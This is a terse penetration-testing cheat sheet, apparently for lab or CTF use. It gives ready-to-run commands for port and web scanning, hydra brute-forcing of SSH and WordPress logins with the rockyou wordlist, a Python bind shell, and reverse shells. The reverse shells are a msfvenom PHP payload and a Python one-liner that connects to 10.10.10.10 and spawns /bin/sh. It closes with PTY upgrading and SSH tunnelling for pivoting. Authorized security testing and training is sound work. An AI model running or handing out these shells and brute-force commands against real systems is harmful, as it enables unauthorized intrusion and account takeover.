
## Port Scanning
```bash
sudo nmap 10.10.10.10 -sS -sU --min-rate 1000 -oA demo-openports-initial
```

## Web Crawling
```bash
dirsearch.py -u 10.10.10.10 --simple-report demo-webcrawl.txt
```

## Vulnerability Scanning
```bash
nikto -h 10.10.10.10 -Format txt -o demo-vulnscan-web.txt
```

## Password Guessing
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -t4 ssh

hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/blog/wp-login.php?:log=^USER^&pwd=^PASS^:Error"
```

## Bind Shells
```python
python -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",443));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

## Reverse Shells
```bash
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -f raw -o shell.php

export RHOST="10.10.10.10"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

## Upgrade to a PTY Shell
```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
python /tmp/shell.py
```

## Pivoting
```bash
ssh -R 8080:localhost:8080 victor@home.edu
```
